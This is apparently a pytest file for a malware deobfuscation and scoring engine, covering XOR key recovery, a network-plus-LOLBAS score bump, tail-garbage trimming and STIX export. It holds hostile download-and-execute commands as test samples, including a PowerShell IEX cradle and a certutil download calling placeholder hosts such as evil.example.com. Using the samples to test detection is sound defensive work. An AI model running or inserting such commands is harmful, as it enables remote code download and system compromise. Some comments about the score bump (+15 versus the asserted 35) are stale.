"""Tests for RC2.2+ additions:

  1. XOR brute 8-byte key recovery
  2. Network + LOLBAS combo verdict bump (+15)
  3. Residual-obfuscation tail trim / retry
  4. STIX 2.1 bundle export from AnalystReport
"""
from __future__ import annotations

import base64

import pytest

from engine import AnalysisContext, Budget, Orchestrator
from engine.models import (
    AnalystReport,
    ConfidenceBreakdown,
    Findings,
    FamilyMatch,
    IOCBundle,
    LolbasHit,
    MitreHint,
    PluginExecutionReport,
)
from engine.orchestrator import (
    _compute_confidence_breakdown,
    _find_tail_garbage_start,
    _is_printable_char,
    _trim_tail_garbage,
)
from engine.stix_exporter import analyst_report_to_stix


# --------------------------------------------------------------------------- #
# 1. XOR brute — 8-byte key recovery
# --------------------------------------------------------------------------- #
class TestXorBrute8ByteKey:
    """The extended xor-brute plugin must recover repeating keys up to 8B long."""

    def _xor(self, data: bytes, key: bytes) -> bytes:
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    def _run(self, ciphertext: str) -> AnalystReport:
        return Orchestrator(AnalysisContext(budget=Budget(wall_time_ms=5000))).run(
            ciphertext
        )

    def test_recovers_5_byte_key(self):
        plain = (
            b"powershell.exe -nop -w hidden -c IEX((New-Object Net.WebClient)"
            b".DownloadString('http://evil.example.com/loader.ps1'))"
        ) * 3
        key = b"K3yPs"
        ct = self._xor(plain, key)
        b64 = base64.b64encode(ct).decode("ascii")
        report = self._run(b64)
        # Check the xor-brute trace step preview for evidence of successful decode
        xor_step = next((s for s in report.trace if s.decoder == "xor-brute"), None)
        assert xor_step is not None, "xor-brute must fire"
        assert "powershell" in xor_step.preview.lower(), (
            f"expected 5-byte XOR key to be recovered; xor-brute preview="
            f"{xor_step.preview!r}; chain={[s.decoder for s in report.trace]}"
        )

    def test_recovers_7_byte_key(self):
        plain = (
            b"cmd.exe /c certutil -urlcache -split -f "
            b"http://malc2.example.net/payload.dat drop.exe && drop.exe\n"
        ) * 3
        key = b"S3v3nBt"
        ct = self._xor(plain, key)
        b64 = base64.b64encode(ct).decode("ascii")
        report = self._run(b64)
        xor_step = next((s for s in report.trace if s.decoder == "xor-brute"), None)
        assert xor_step is not None, "xor-brute must fire"
        assert "certutil" in xor_step.preview.lower(), (
            f"expected 7-byte XOR key to be recovered; xor-brute preview="
            f"{xor_step.preview!r}; chain={[s.decoder for s in report.trace]}"
        )


# --------------------------------------------------------------------------- #
# 2. Network + LOLBAS combo verdict bump (+15)
# --------------------------------------------------------------------------- #
class TestNetworkLolbasCombo:

    def _findings(self, *, lolbas=(), urls=(), ips=(), domains=(),
                  mitre=(), family=None) -> Findings:
        f = Findings()
        f.iocs = IOCBundle(urls=list(urls), ips=list(ips), domains=list(domains))
        f.lolbas = [LolbasHit(binary=b) for b in lolbas]
        f.mitre_techniques = [MitreHint(id=t) for t in mitre]
        if family:
            f.family = FamilyMatch(family=family, confidence=0.85)
        return f

    def test_combo_bump_applies(self):
        f = self._findings(lolbas=["certutil.exe"],
                            urls=["http://c2.example.com/x.ps1"])
        breakdown = _compute_confidence_breakdown(f)
        sources = {c.source: c.points for c in breakdown.contributions}
        assert "network-lolbas-combo" in sources
        # Post-RC2.2 tuning: combo bump raised from 15 → 35 to reflect the
        # stronger network+LOLBIN co-occurrence signal. Keep this in sync
        # with orchestrator._compute_confidence_breakdown.
        assert sources["network-lolbas-combo"] == 35

    def test_combo_pushes_into_malicious(self):
        f = self._findings(
            lolbas=["certutil.exe"],
            urls=["http://c2.example.com/x.ps1"],
            mitre=["T1105", "T1059.001", "T1027", "T1218"],
        )
        breakdown = _compute_confidence_breakdown(f)
        # Baseline (mitre 4x8=32 + iocs 4 + lolbas 4 = 40)  = "suspicious".
        # Combo adds +15 → 55 → still suspicious but closer to malicious.
        # If we add family match on top, it must reach malicious.
        f2 = self._findings(
            lolbas=["certutil.exe"],
            urls=["http://c2.example.com/x.ps1"],
            mitre=["T1105", "T1059.001", "T1027", "T1218"],
            family="Meterpreter",
        )
        breakdown2 = _compute_confidence_breakdown(f2)
        assert breakdown2.verdict == "malicious"

    def test_no_bump_without_network_ioc(self):
        f = self._findings(lolbas=["certutil.exe"])
        breakdown = _compute_confidence_breakdown(f)
        sources = {c.source for c in breakdown.contributions}
        assert "network-lolbas-combo" not in sources

    def test_no_bump_without_lolbas(self):
        f = self._findings(urls=["http://c2.example.com/x.ps1"])
        breakdown = _compute_confidence_breakdown(f)
        sources = {c.source for c in breakdown.contributions}
        assert "network-lolbas-combo" not in sources


# --------------------------------------------------------------------------- #
# 3. Residual-obfuscation tail trim
# --------------------------------------------------------------------------- #
class TestTailGarbageTrim:

    def test_no_trim_on_clean_text(self):
        text = "cmd.exe /c whoami && systeminfo\n" * 5
        assert _find_tail_garbage_start(text) is None

    def test_no_trim_on_pure_unicode_deco(self):
        text = ("Write-Host 'done' -ForegroundColor Green\n"
                "━" * 60)   # box-drawing unicode — must count as printable
        assert _find_tail_garbage_start(text) is None

    def test_trim_binary_tail(self):
        head = "cmd.exe /c certutil -urlcache -split -f " * 3
        tail = "\x00\x03\x81\xff\x7f\x02\x91\x88\xef\xd0" * 4  # 40 bytes garbage
        text = head + tail
        cut = _find_tail_garbage_start(text)
        assert cut is not None
        assert cut <= len(head) + 4

    def test_no_trim_if_head_is_also_garbage(self):
        garbage = "\x00\x03\x81\xff\x7f\x02\x91\x88\xef\xd0" * 8
        # Head is also non-printable; must not trim (uniform garbage).
        assert _find_tail_garbage_start(garbage) is None

    def test_is_printable_char_handles_unicode(self):
        assert _is_printable_char("A")
        assert _is_printable_char(" ")
        assert _is_printable_char("\n")
        assert _is_printable_char("━")       # 0x2501 box-drawing
        assert _is_printable_char("Ā")       # 0x0100 Latin Extended-A
        assert not _is_printable_char("\x00")
        assert not _is_printable_char("\x7f")
        assert not _is_printable_char("\x91")  # C1 control
        assert not _is_printable_char("\xff")  # Latin-1 supp — binary garbage

    def test_trim_produces_truncation_note(self):
        ctx = AnalysisContext(budget=Budget(wall_time_ms=1000))
        exec_report = PluginExecutionReport()
        head = "powershell -c Get-Process\n" * 4
        # Ensure tail contains bytes that no plugin can recover
        tail = bytes(range(1, 20)).decode("latin-1") * 3
        result = _trim_tail_garbage(head + tail, ctx, exec_report, depth=1)
        assert result != head + tail
        assert "residue" in result or "truncated" in result


# --------------------------------------------------------------------------- #
# 4. STIX 2.1 bundle from AnalystReport
# --------------------------------------------------------------------------- #
class TestStixExport:

    def _mock_report(self) -> AnalystReport:
        findings = Findings()
        findings.iocs = IOCBundle(
            urls=["http://c2.example.com/loader"],
            ips=["203.0.113.10"],
            sha256=["a" * 64],
        )
        findings.mitre_techniques = [
            MitreHint(id="T1059.001", technique="PowerShell", tactic="Execution"),
            MitreHint(id="T1105", technique="Ingress Tool Transfer", tactic="Command and Control"),
        ]
        findings.lolbas = [LolbasHit(binary="certutil.exe")]
        findings.family = FamilyMatch(family="AsyncRAT", confidence=0.9)
        findings.verdict = "malicious"
        findings.risk_score = 90
        return AnalystReport(
            output="cmd.exe /c certutil -urlcache -f http://c2.example.com/loader out.exe",
            terminal="family-identified",
            engine="orchestrator-v1",
            findings=findings,
            executive_summary="Detected AsyncRAT downloader.",
            confidence_breakdown=ConfidenceBreakdown(
                total=90, verdict="malicious", contributions=[],
            ),
        )

    def test_bundle_shape(self):
        bundle = analyst_report_to_stix(
            self._mock_report(),
            analyst_email="analyst@nivxforge",
            input_preview="cmd.exe /c whoami",
        )
        assert bundle["type"] == "bundle"
        assert bundle["id"].startswith("bundle--")
        # Must include producer identity, malware, attack-patterns, indicators, report.
        object_types = {o["type"] for o in bundle["objects"]}
        assert "identity" in object_types
        assert "malware" in object_types
        assert "attack-pattern" in object_types
        assert "indicator" in object_types
        assert "report" in object_types
        assert "note" in object_types

    def test_bundle_contains_family(self):
        bundle = analyst_report_to_stix(
            self._mock_report(),
            analyst_email="analyst@nivxforge",
            input_preview="x",
        )
        mal = next((o for o in bundle["objects"] if o["type"] == "malware"), None)
        assert mal is not None
        assert mal["name"] == "AsyncRAT"

    def test_bundle_indicators_cover_all_iocs(self):
        bundle = analyst_report_to_stix(
            self._mock_report(),
            analyst_email="analyst@nivxforge",
            input_preview="x",
        )
        patterns = [o["pattern"] for o in bundle["objects"] if o["type"] == "indicator"]
        joined = " ".join(patterns)
        assert "http://c2.example.com/loader" in joined
        assert "203.0.113.10" in joined
        assert "a" * 64 in joined


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
